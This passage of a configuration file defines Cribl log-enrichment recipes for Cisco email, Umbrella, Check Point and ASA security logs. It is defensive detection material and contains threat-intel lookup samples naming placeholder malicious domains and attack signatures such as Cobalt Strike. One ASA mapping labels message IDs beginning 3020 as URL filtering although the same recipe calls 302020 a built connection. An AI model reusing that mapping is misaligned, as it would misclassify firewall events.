          notes: 'High-risk attachments to VIP recipients should trigger immediate SOC review. Archive formats (zip/rar) are medium risk due to potential payload concealment. Consider blocking executables entirely at gateway.'
        }
      },
      {
        name: 'Domain Age Lookup',
        description: 'Enrich sender domain with WHOIS registration age, registrar, and new-domain classification to identify recently created phishing domains.',
        criblFunction: 'Lookup',
        addedFields: ['domain_age_days', 'domain_registrar', 'is_new_domain'],
        securityValue: 'Newly registered domains (<30 days) are heavily correlated with phishing campaigns. Domain age is one of the strongest indicators of sender legitimacy.',
        observabilityValue: 'Tracks new-domain email volume trends and identifies registrars associated with malicious activity for proactive blocking.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'domain_whois.csv',
            inputField: 'sender_domain → domain',
            outputFields: ['domain_age_days', 'domain_registrar', 'is_new_domain'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'domain,age_days,registrar,is_new\nlegit-company.com,4500,MarkMonitor,false\nsuspicious-invoice.xyz,5,Namecheap,true\ntrusted-vendor.com,3200,CSC Global,false\nurgent-payment.online,12,GoDaddy,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: domain_whois.csv\n// Input: sender_domain → domain (exact match)\n// Output: age_days → domain_age_days, registrar → domain_registrar, is_new → is_new_domain\n//\n// BEFORE: { sender_domain: "suspicious-invoice.xyz", from_address: "billing@suspicious-invoice.xyz", subject: "Payment Required" }\n// AFTER:  { ..., domain_age_days: 5, domain_registrar: "Namecheap", is_new_domain: "true" }',
          notes: 'Source WHOIS data from DomainTools, WhoisXML API, or similar. Update every 6 hours for newly seen domains. Domains <30 days old + suspicious content = high phishing confidence. Some legitimate new domains exist — combine with other signals.'
        }
      },
      {
        name: 'Email Authentication Scoring',
        description: 'Calculate a composite email authentication score combining SPF, DKIM, and DMARC results with a spoofing indicator.',
        criblFunction: 'Eval',
        addedFields: ['auth_score', 'auth_pass_all', 'spoofing_indicator'],
        securityValue: 'Emails failing authentication checks are likely spoofed. Combined auth score provides single-glance legitimacy assessment for analysts triaging suspicious emails.',
        observabilityValue: 'Tracks email authentication pass rates across sending domains. Identifies domains with misconfigured authentication that need outreach.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'auth_score = (spf_result==\'pass\' ? 3 : 0) + (dkim_result==\'pass\' ? 4 : 0) + (dmarc_result==\'pass\' ? 3 : 0)',
              'auth_pass_all = spf_result==\'pass\' && dkim_result==\'pass\' && dmarc_result==\'pass\' ? \'true\' : \'false\'',
              'spoofing_indicator = auth_score < 4 && reputation_score < 5 ? \'likely_spoofed\' : auth_score < 7 ? \'partial_auth\' : \'authenticated\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// auth_score = weighted sum of SPF(3) + DKIM(4) + DMARC(3) = max 10\n// auth_pass_all = all three pass boolean\n// spoofing_indicator = combine auth + reputation for spoofing assessment\n//\n// BEFORE: { spf_result: "fail", dkim_result: "fail", dmarc_result: "fail", reputation_score: 2 }\n// AFTER:  { ..., auth_score: 0, auth_pass_all: "false", spoofing_indicator: "likely_spoofed" }',
          notes: 'DKIM weighted highest (4 points) as hardest to spoof. SPF and DMARC each get 3 points. Score 10 = fully authenticated, 0 = no authentication. spoofing_indicator combines auth with reputation for higher confidence.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Sender History Query',
        description: 'At investigation time, retrieve 30-day sending history for a specific sender — message volume and previous verdict distribution.',
        criblFunction: 'Search-time lookup',
        addedFields: ['messages_from_sender_30d', 'previous_verdicts'],
        securityValue: 'Distinguishes first-time suspicious senders (higher risk) from known senders with clean history (likely false positive). Volume spike from known sender may indicate account compromise.',
        observabilityValue: 'Identifies sender volume patterns for capacity planning and detects anomalous sending patterns that may indicate compromised partner accounts.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search sender history:\n// dataset="cisco_secure_email" earliest=-30d\n// | where from_address == "$SUSPECT_SENDER"\n// | summarize messages_from_sender_30d=count(), previous_verdicts=makeset(verdict), clean_count=countif(verdict=="clean"), suspicious_count=countif(verdict!="clean") by from_address\n// | extend sender_risk = iif(messages_from_sender_30d == 1, "first_time", iif(suspicious_count > clean_count, "mostly_suspicious", "mostly_clean"))\n// | extend verdict_ratio = round(clean_count / messages_from_sender_30d * 100, 1)',
          notes: 'First-time senders with suspicious content are highest risk. Previously clean senders suddenly sending malicious content suggests account compromise — notify the sending organization.'
        }
      },
      {
        name: 'Phishing Campaign Correlation',
        description: 'At investigation time, identify potential phishing campaigns by correlating similar subjects and sender patterns within a 24-hour window.',
        criblFunction: 'Search-time lookup',
        addedFields: ['similar_subjects_24h', 'campaign_indicator'],
        securityValue: 'Identifies coordinated phishing campaigns targeting multiple users simultaneously. Campaign-level detection enables bulk remediation (purge all related emails) rather than one-off response.',
        observabilityValue: 'Measures campaign frequency and targeting breadth. Supports executive reporting on phishing campaign volume and organizational exposure.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search phishing campaign correlation:\n// dataset="cisco_secure_email" earliest=-24h\n// | where verdict != "clean"\n// | extend subject_normalized = tolower(replace_regex(subject, \'[0-9]+\', \'N\'))\n// | summarize similar_subjects_24h=count(), targeted_users=dcount(to_address), sender_domains=makeset(sender_domain) by subject_normalized\n// | where similar_subjects_24h > 3\n// | extend campaign_indicator = iif(similar_subjects_24h > 10, "active_campaign", iif(similar_subjects_24h > 3, "possible_campaign", "isolated"))\n// | order by similar_subjects_24h desc',
          notes: 'Normalize subjects by lowercasing and replacing numbers to group variants. >3 similar suspicious subjects in 24h = possible campaign. >10 = active campaign requiring immediate response and bulk purge of matching messages.'
        }
      }
    ]
  },
  'cisco-umbrella': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to external IPs observed in DNS proxy logs — country, city, and ASN for the resolved destination.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn'],
        securityValue: 'Identifies DNS resolutions pointing to infrastructure in high-risk geolocations, supports geo-fencing policies, and enriches IOC triage with geographic attribution.',
        observabilityValue: 'Enables geographic distribution dashboards for DNS traffic patterns, identifies unexpected regional shifts in resolution targets, supports CDN performance analysis.',
        personas: ['SOC', 'Security Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'external_ip',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'geo_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: external_ip\n// Output Fields: geo_country, geo_city, geo_asn\n//\n// BEFORE: { external_ip: "185.220.101.34", domain: "suspicious.example.com", identity: "jsmith" }\n// AFTER:  { external_ip: "185.220.101.34", geo_country: "DE", geo_city: "Frankfurt", geo_asn: "AS205100", domain: "suspicious.example.com", identity: "jsmith" }',
          notes: 'MaxMind GeoLite2 databases auto-update weekly. Focus GeoIP on external_ip only — internal resolver IPs add no value. Useful for flagging resolutions to Tor exit nodes and bulletproof hosting ASNs.'
        }
      },
      {
        name: 'Domain Risk Lookup',
        description: 'Enrich queried domains against a threat intelligence CSV containing risk scores, domain age, registrar, and DGA classification.',
        criblFunction: 'Lookup',
        addedFields: ['domain_risk_score', 'domain_age_days', 'domain_registrar', 'is_dga'],
        securityValue: 'Flags high-risk domains at ingestion time — newly registered domains, known malicious infrastructure, and algorithmically generated domains — enabling real-time alerting without SIEM correlation delay.',
        observabilityValue: 'Tracks domain risk distribution across the environment, identifies registrars associated with abuse, and monitors DGA detection rates for botnet activity trending.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'domain_threat_intel.csv',
            inputField: 'domain → queried_domain',
            outputFields: ['domain_risk_score', 'domain_age_days', 'domain_registrar', 'is_dga'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'queried_domain,risk_score,age_days,registrar,is_dga\nevil-payload.xyz,95,3,Namecheap,false\nxk7qm2v9.top,99,1,Eranet,true\nlegitimate-vendor.com,5,4200,MarkMonitor,false\nsuspicious-login.net,78,14,GoDaddy,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: domain_threat_intel.csv\n// Input: domain → queried_domain (exact match)\n// Output: risk_score → domain_risk_score, age_days → domain_age_days, registrar → domain_registrar, is_dga\n//\n// BEFORE: { domain: "xk7qm2v9.top", external_ip: "45.33.32.156", action: "allowed" }\n// AFTER:  { ..., domain_risk_score: 99, domain_age_days: 1, domain_registrar: "Eranet", is_dga: "true" }',
          notes: 'Aggregate feeds from DomainTools, URLhaus, and internal DGA classifier output. Reload every 15 minutes for near-real-time coverage. DGA flag alone should trigger immediate SOC review.'
        }
      },
      {
        name: 'Category Severity Eval',
        description: 'Map Cisco Umbrella content categories to risk tiers, flag security-relevant categories, and generate blocking recommendations.',
        criblFunction: 'Eval',
        addedFields: ['category_risk_tier', 'is_security_category', 'block_recommended'],
        securityValue: 'Normalizes Umbrella category taxonomy into actionable risk tiers for alerting. Immediately identifies requests to malware, phishing, and C2 categories without analysts memorizing 80+ category codes.',
        observabilityValue: 'Enables category distribution dashboards, tracks policy effectiveness by risk tier, and identifies category drift over time for policy tuning.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'category_risk_tier = [\'Malware\',\'Command and Control\',\'Phishing\'].includes(categories) ? \'critical\' : [\'Newly Seen Domains\',\'Cryptomining\',\'Dynamic DNS\'].includes(categories) ? \'high\' : [\'Proxy/Anonymizer\',\'Potentially Harmful\'].includes(categories) ? \'medium\' : \'low\'',
              'is_security_category = [\'Malware\',\'Command and Control\',\'Phishing\',\'Cryptomining\',\'Newly Seen Domains\',\'Dynamic DNS\'].includes(categories) ? \'true\' : \'false\'',
              'block_recommended = category_risk_tier === \'critical\' || (category_risk_tier === \'high\' && action === \'allowed\') ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// category_risk_tier = map Umbrella categories to critical/high/medium/low\n// is_security_category = boolean for security-relevant categories\n// block_recommended = flag allowed requests that should be blocked\n//\n// BEFORE: { categories: "Command and Control", action: "allowed", domain: "c2-server.xyz" }\n// AFTER:  { ..., category_risk_tier: "critical", is_security_category: "true", block_recommended: "true" }',
          notes: 'Review Umbrella category mappings quarterly as new categories are added. Critical tier should always generate alerts. block_recommended flags policy gaps where dangerous categories are still allowed.'
        }
      },
      {
        name: 'Internal Asset Lookup',
        description: 'Enrich internal IP addresses from Umbrella logs with CMDB data — hostname, business unit, asset owner, and environment classification.',
        criblFunction: 'Lookup',
        addedFields: ['hostname', 'business_unit', 'asset_owner', 'environment'],
        securityValue: 'Associates suspicious DNS queries with specific hosts and owners for immediate investigation context. Enables business-unit-scoped threat hunting and prioritization of alerts on production assets.',
        observabilityValue: 'Enables DNS query volume analysis by business unit, identifies environments generating anomalous query patterns, and supports capacity planning per department.',
        personas: ['SOC', 'Incident Response', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'cmdb_assets.csv',
            inputField: 'internal_ip → ip_address',
            outputFields: ['hostname', 'business_unit', 'asset_owner', 'environment'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'ip_address,hostname,business_unit,asset_owner,environment\n10.1.5.20,ws-finance-042,Finance,jdoe@company.com,production\n10.2.3.15,srv-dev-api-01,Engineering,ksmith@company.com,development\n10.1.8.100,dc-prod-02,Infrastructure,netops@company.com,production\n10.3.1.45,laptop-sales-019,Sales,mjones@company.com,corporate',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: cmdb_assets.csv\n// Input: internal_ip → ip_address (exact match)\n// Output: hostname, business_unit, asset_owner, environment\n//\n// BEFORE: { internal_ip: "10.1.5.20", domain: "suspicious-site.xyz", action: "blocked" }\n// AFTER:  { ..., hostname: "ws-finance-042", business_unit: "Finance", asset_owner: "jdoe@company.com", environment: "production" }',
          notes: 'Source from ServiceNow CMDB via scheduled REST export. Refresh every 4 hours. Missing lookups indicate unmanaged assets — consider alerting on DNS queries from unknown internal IPs.'
        }
      },
      {
        name: 'Identity Group Lookup',
        description: 'Enrich Umbrella identity field with organizational context — department, office location, and user risk level from HR/identity directory.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_location', 'user_risk_level'],
        securityValue: 'Enables risk-based alerting thresholds per user group (executives get tighter monitoring), identifies compromised accounts by department anomaly, and accelerates incident scoping.',
        observabilityValue: 'Enables DNS usage analytics by department and location, identifies shadow IT adoption patterns per group, and supports per-team bandwidth attribution.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'identity_directory.csv',
            inputField: 'identity → username',
            outputFields: ['user_department', 'user_location', 'user_risk_level'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'username,department,location,risk_level\njsmith,Engineering,San Francisco,low\nmjohnson,Finance,New York,medium\ncexec01,Executive,San Francisco,high\ncontractor-ext-05,Vendor,Remote,high',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: identity_directory.csv\n// Input: identity → username (exact match)\n// Output: department → user_department, location → user_location, risk_level → user_risk_level\n//\n// BEFORE: { identity: "cexec01", domain: "file-share.xyz", action: "allowed" }\n// AFTER:  { ..., user_department: "Executive", user_location: "San Francisco", user_risk_level: "high" }',
          notes: 'Sync from Okta/Azure AD via SCIM export or scheduled API pull. High-risk users include executives, contractors, and accounts with prior incidents. Refresh every 6 hours or on identity change events.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Historical Domain Query',
        description: 'At investigation time, retrieve historical query data for a domain — when it was first queried in the environment and total query volume over 30 days.',
        criblFunction: 'Search-time lookup',
        addedFields: ['first_queried_date', 'total_queries_30d'],
        securityValue: 'Newly queried domains (first seen recently) combined with high volume indicate potential beaconing or C2 activity. Long-established domains with sudden volume spikes may indicate compromised legitimate infrastructure.',
        observabilityValue: 'Supports capacity trending for DNS infrastructure, identifies domains driving query volume growth, and aids in cache optimization decisions.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search domain history:\n// dataset="cisco_umbrella" earliest=-30d\n// | where domain == "$SUSPECT_DOMAIN"\n// | summarize first_queried_date=min(timestamp), total_queries_30d=count() by domain\n// | extend days_known = datetime_diff(\'day\', now(), first_queried_date)\n// | extend query_velocity = iif(days_known < 3 && total_queries_30d > 100, "high_velocity_new", iif(total_queries_30d > 1000, "high_volume", "normal"))',
          notes: 'Domains first seen <7 days ago with >50 queries/day are strong beaconing indicators. Cross-reference with domain_risk_score from stream-time enrichment for highest confidence detections.'
        }
      },
      {
        name: 'User DNS Baseline',
        description: 'At investigation time, retrieve a user\'s typical DNS behavior — average daily queries and unique domains visited — to identify anomalous activity.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_queries_daily', 'unique_domains_daily'],
        securityValue: 'Users querying 10x their normal volume or resolving significantly more unique domains than baseline are strong indicators of DNS tunneling, data exfiltration, or malware beaconing.',
        observabilityValue: 'Establishes per-user DNS baselines for capacity planning, identifies power users driving infrastructure load, and detects misconfigured applications generating excessive queries.',
        personas: ['SOC', 'Threat Hunting', 'SRE'],
        implementation: {
          example: '// Cribl Search user DNS baseline:\n// dataset="cisco_umbrella" earliest=-30d latest=-1d\n// | where identity == "$SUSPECT_USER"\n// | extend query_date = format_datetime(timestamp, \'yyyy-MM-dd\')\n// | summarize daily_queries=count(), daily_unique_domains=dcount(domain) by query_date\n// | summarize avg_queries_daily=round(avg(daily_queries), 0), unique_domains_daily=round(avg(daily_unique_domains), 0)\n// | extend current_deviation = round(($TODAY_QUERIES - avg_queries_daily) / avg_queries_daily * 100, 1)',
          notes: 'Baseline requires 14+ days of data for reliability. Deviation >200% from avg_queries_daily is a strong anomaly signal. Unique domains >3x baseline often indicates DGA malware or DNS tunneling tools.'
        }
      }
    ]
  },
  'checkpoint-fw': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to both source and destination IPs in Check Point firewall logs — country, city, and ASN for each direction.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'src_asn', 'dst_country', 'dst_city', 'dst_asn'],
        securityValue: 'Enables geographic policy enforcement, identifies connections to/from sanctioned nations, supports impossible travel detection across firewall sessions, and enriches IOC triage.',
        observabilityValue: 'Enables geographic traffic flow visualization, identifies regional routing anomalies, monitors egress patterns by country for cost and performance optimization.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'src',
            additionalInputs: ['dst'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dst_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: src → src_country, src_city, src_asn\n// Additional Input: dst → dst_country, dst_city, dst_asn\n//\n// BEFORE: { src: "203.0.113.50", dst: "10.1.2.5", action: "Drop", rule: "Inbound-Block" }\n// AFTER:  { src: "203.0.113.50", src_country: "CN", src_city: "Beijing", src_asn: "AS4134", dst: "10.1.2.5", dst_country: "RFC1918", dst_city: "Private", dst_asn: "N/A", action: "Drop", rule: "Inbound-Block" }',
          notes: 'Apply GeoIP to both src and dst in a single pipeline. Skip RFC1918 addresses for performance (they resolve to "Private"). Weekly MaxMind updates ensure current geo attribution.'
        }
      },
      {
        name: 'Internal/External Classification Eval',
        description: 'Classify source and destination IPs as internal or external based on RFC1918 ranges, and derive traffic direction (inbound, outbound, east-west).',
        criblFunction: 'Eval',
        addedFields: ['src_internal', 'dst_internal', 'traffic_direction'],
        securityValue: 'Immediately categorizes traffic flow for detection rules — lateral movement (east-west), exfiltration (outbound from sensitive segments), and inbound attacks without manual network knowledge.',
        observabilityValue: 'Enables north-south vs east-west traffic ratio monitoring, detects unexpected routing patterns, and supports segmentation compliance validation.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'src_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(src) ? \'true\' : \'false\'',
              'dst_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(dst) ? \'true\' : \'false\'',
              'traffic_direction = src_internal==\'true\' && dst_internal==\'true\' ? \'east-west\' : src_internal==\'true\' ? \'outbound\' : dst_internal==\'true\' ? \'inbound\' : \'transit\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Classify IPs and derive traffic direction\n//\n// BEFORE: { src: "10.1.2.5", dst: "198.51.100.42", action: "Accept", rule: "Outbound-Allow" }\n// AFTER:  { ..., src_internal: "true", dst_internal: "false", traffic_direction: "outbound" }',
          notes: 'Adjust regex patterns if your environment uses non-standard private ranges (e.g., CGNAT 100.64.0.0/10). Transit traffic (external→external) through your firewall may indicate routing misconfigurations.'
        }
      },
      {
        name: 'Blade Severity Normalization Eval',
        description: 'Normalize severity and confidence across Check Point blades (IPS, Anti-Bot, Threat Emulation, App Control) into a unified priority scoring model.',
        criblFunction: 'Eval',
        addedFields: ['normalized_severity', 'priority_score', 'escalation_needed'],
        securityValue: 'Check Point blades use inconsistent severity scales — IPS uses Critical/High/Medium/Low while Anti-Bot uses confidence percentages. Normalization enables consistent alert prioritization across all blades.',
        observabilityValue: 'Provides unified severity distribution metrics across all blades, enables consistent SLA tracking regardless of detection source, and supports workload balancing for SOC analysts.',
        personas: ['SOC', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'normalized_severity = blade==\'IPS\' ? severity : blade==\'Anti-Bot\' ? (confidence > 80 ? \'Critical\' : confidence > 60 ? \'High\' : \'Medium\') : blade==\'Threat Emulation\' ? (verdict==\'Malicious\' ? \'Critical\' : \'Medium\') : \'Low\'',
              'priority_score = normalized_severity==\'Critical\' ? 10 : normalized_severity==\'High\' ? 7 : normalized_severity==\'Medium\' ? 4 : 1',
              'escalation_needed = priority_score >= 7 && action==\'Detect\' ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Normalize severity across Check Point blades\n//\n// BEFORE: { blade: "Anti-Bot", confidence: 92, action: "Detect", bot_name: "Emotet" }\n// AFTER:  { ..., normalized_severity: "Critical", priority_score: 10, escalation_needed: "true" }',
          notes: 'Escalation_needed flags events with high severity that were only detected (not prevented). These represent active threats that bypassed inline blocking and require immediate SOC response.'
        }
      },
      {
        name: 'Asset Inventory Lookup',
        description: 'Enrich source IPs with CMDB data — hostname, business unit, and asset criticality tier for prioritized alert handling.',
        criblFunction: 'Lookup',
        addedFields: ['src_hostname', 'src_business_unit', 'src_criticality'],
        securityValue: 'Enables priority-based alert routing — Critical tier assets trigger immediate escalation. Business unit context allows team-specific detection rules and faster incident assignment.',
        observabilityValue: 'Enables firewall traffic analysis by business unit, identifies departments generating unusual traffic patterns, and supports capacity planning per criticality tier.',
        personas: ['SOC', 'Incident Response', 'Platform Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'asset_inventory.csv',
            inputField: 'src → ip_address',
            outputFields: ['src_hostname', 'src_business_unit', 'src_criticality'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'ip_address,hostname,business_unit,criticality\n10.1.2.5,web-prod-01,Commerce,Tier-1\n10.1.3.20,app-stg-01,Platform,Tier-3\n10.2.1.10,db-prod-primary,Finance,Tier-1\n10.3.5.100,dev-workstation-42,Engineering,Tier-4',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: asset_inventory.csv\n// Input: src → ip_address (exact match)\n// Output: hostname → src_hostname, business_unit → src_business_unit, criticality → src_criticality\n//\n// BEFORE: { src: "10.1.2.5", dst: "198.51.100.1", action: "Drop", blade: "IPS" }\n// AFTER:  { ..., src_hostname: "web-prod-01", src_business_unit: "Commerce", src_criticality: "Tier-1" }',
          notes: 'Pull from ServiceNow CMDB via REST API on a 4-hour schedule. Tier-1 assets with threat detections should auto-escalate to senior analysts. Missing lookups indicate shadow IT or unmanaged devices.'
        }
      },
      {
        name: 'Threat Intelligence Lookup',
        description: 'Enrich Check Point protection_name field with extended threat context — kill chain phase, threat category, and associated CVE identifiers.',
        criblFunction: 'Lookup',
        addedFields: ['threat_category', 'kill_chain_phase', 'cve_id'],
        securityValue: 'Maps Check Point signatures to MITRE ATT&CK kill chain phases for detection coverage analysis. CVE association enables vulnerability-aware prioritization and patch verification.',
        observabilityValue: 'Enables kill chain phase distribution dashboards, tracks detection coverage gaps across phases, and measures time-to-detect per threat category.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'checkpoint_threat_context.csv',
            inputField: 'protection_name → signature',
            outputFields: ['threat_category', 'kill_chain_phase', 'cve_id'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'signature,threat_category,kill_chain_phase,cve_id\nApache Log4j RCE (CVE-2021-44228),Exploit,Initial Access,CVE-2021-44228\nEmotet Botnet Communication,Malware,Command and Control,N/A\nSQLi Attempt - Union Based,Web Attack,Exploitation,N/A\nCobalt Strike Beacon,Post-Exploitation,Command and Control,N/A',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: checkpoint_threat_context.csv\n// Input: protection_name → signature (exact match)\n// Output: threat_category, kill_chain_phase, cve_id\n//\n// BEFORE: { protection_name: "Apache Log4j RCE (CVE-2021-44228)", blade: "IPS", action: "Prevent", severity: "Critical" }\n// AFTER:  { ..., threat_category: "Exploit", kill_chain_phase: "Initial Access", cve_id: "CVE-2021-44228" }',
          notes: 'Build lookup from Check Point ThreatWiki exports combined with MITRE ATT&CK mapping. Update hourly for new signature releases. Kill chain phase enables detection gap analysis — are you only catching Exploitation but missing Reconnaissance?'
        }
      }
    ],
    searchTime: [
      {
        name: 'Connection Baseline',
        description: 'At investigation time, retrieve hourly connection baselines for a source IP to identify anomalous connection volume or pattern changes.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_connections_hourly', 'deviation_pct'],
        securityValue: 'Identifies hosts generating anomalous connection volumes — potential indicators of scanning, lateral movement, or C2 beaconing. Deviation percentage provides immediate anomaly scoring.',
        observabilityValue: 'Supports capacity baseline monitoring, identifies hosts driving connection table exhaustion, and detects application behavior changes after deployments.',
        personas: ['SOC', 'Threat Hunting', 'NOC', 'SRE'],
        implementation: {
          example: '// Cribl Search connection baseline:\n// dataset="checkpoint_fw" earliest=-7d latest=-1d\n// | where src == "$SUSPECT_IP"\n// | extend hour_bucket = format_datetime(timestamp, \'yyyy-MM-dd HH:00\')\n// | summarize connections_per_hour=count() by hour_bucket\n// | summarize avg_connections_hourly=round(avg(connections_per_hour), 0), stddev_connections=round(stdev(connections_per_hour), 0)\n// | extend current_deviation_pct = round(($CURRENT_HOUR_COUNT - avg_connections_hourly) / avg_connections_hourly * 100, 1)\n// | extend anomaly_level = iif(current_deviation_pct > 300, "critical", iif(current_deviation_pct > 150, "high", "normal"))',
          notes: 'Baseline requires 7+ days of data for reliability. Deviation >200% is a strong anomaly signal. Consider time-of-day normalization — servers have different weekday vs weekend baselines.'
        }
      },
      {
        name: 'Rule Hit Analysis',
        description: 'At investigation time, retrieve rule utilization metrics — hit count over 7 days and last modification date — to identify stale or over-triggered rules.',
        criblFunction: 'Search-time lookup',
        addedFields: ['rule_hit_count_7d', 'rule_last_modified'],
        securityValue: 'Identifies rules that never fire (potential coverage gaps if expected to catch threats) and rules firing excessively (noisy rules that need tuning to reduce alert fatigue).',
        observabilityValue: 'Supports firewall rule lifecycle management, identifies candidates for cleanup/consolidation, and tracks policy change impact on hit rates.',
        personas: ['Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Search rule hit analysis:\n// dataset="checkpoint_fw" earliest=-7d\n// | where rule == "$RULE_NAME"\n// | summarize rule_hit_count_7d=count(), unique_sources=dcount(src), unique_destinations=dcount(dst) by rule\n// | extend hits_per_day = round(rule_hit_count_7d / 7, 0)\n// | extend rule_assessment = iif(rule_hit_count_7d == 0, "unused_rule", iif(rule_hit_count_7d > 10000, "noisy_rule", "healthy"))\n// | extend rule_last_modified = "$RULE_MODIFIED_DATE"',
          notes: 'Rules with 0 hits in 7 days may be shadowed by higher-priority rules or targeting obsolete traffic patterns. Rules with >10k hits/week should be reviewed for over-breadth. Pair with change management data for rule_last_modified context.'
        }
      }
    ]
  },
  'cisco-asa': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to source and destination IPs in ASA firewall logs — country, city, and ASN for threat attribution and compliance.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'src_asn', 'dst_country', 'dst_asn'],
        securityValue: 'Enables geo-based alerting for connections to/from sanctioned or high-risk countries, supports impossible travel detection, and enriches incident response with geographic attribution.',
        observabilityValue: 'Enables geographic traffic distribution analysis, identifies unexpected routing to distant regions, and supports WAN optimization decisions based on traffic geography.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'src_ip',
            additionalInputs: ['dst_ip'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dst_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: src_ip → src_country, src_city, src_asn\n// Additional Input: dst_ip → dst_country, dst_asn\n//\n// BEFORE: { src_ip: "198.51.100.50", dst_ip: "10.1.2.100", message_id: "106023", action: "Deny" }\n// AFTER:  { src_ip: "198.51.100.50", src_country: "RU", src_city: "Moscow", src_asn: "AS12389", dst_ip: "10.1.2.100", dst_country: "RFC1918", dst_asn: "N/A", message_id: "106023", action: "Deny" }',
          notes: 'Apply GeoIP to both src_ip and dst_ip. Skip internal IPs for performance. ASA logs may have src_ip/dst_ip or inside_ip/outside_ip depending on syslog format — normalize field names upstream.'
        }
      },
      {
        name: 'Message ID Classification Eval',
        description: 'Classify Cisco ASA message IDs into event categories and subcategories, and flag security-relevant events for prioritized processing.',
        criblFunction: 'Eval',
        addedFields: ['event_category', 'event_subcategory', 'is_security_event'],
        securityValue: 'ASA generates 900+ message IDs — classification reduces analyst cognitive load by grouping into actionable categories. Security-flagged events route to SOC queues while operational events go to NOC.',
        observabilityValue: 'Enables event category distribution dashboards, identifies unusual spikes in specific categories (e.g., failover events), and supports alert volume management.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'event_category = /^1060/.test(message_id) ? \'connection_denied\' : /^3020/.test(message_id) ? \'url_filtering\' : /^4000/.test(message_id) ? \'ips_event\' : /^7130/.test(message_id) ? \'vpn_session\' : /^1051/.test(message_id) ? \'connection_teardown\' : \'other\'',
              'event_subcategory = /^106023/.test(message_id) ? \'acl_deny\' : /^106100/.test(message_id) ? \'acl_permit_deny\' : /^302020/.test(message_id) ? \'connection_built\' : /^713/.test(message_id) ? \'vpn_phase\' : \'general\'',
              'is_security_event = /^(106|400|401|402|710)/.test(message_id) ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Classify ASA message IDs into categories\n//\n// BEFORE: { message_id: "106023", src_ip: "198.51.100.1", dst_ip: "10.1.2.5", action: "Deny" }\n// AFTER:  { ..., event_category: "connection_denied", event_subcategory: "acl_deny", is_security_event: "true" }',
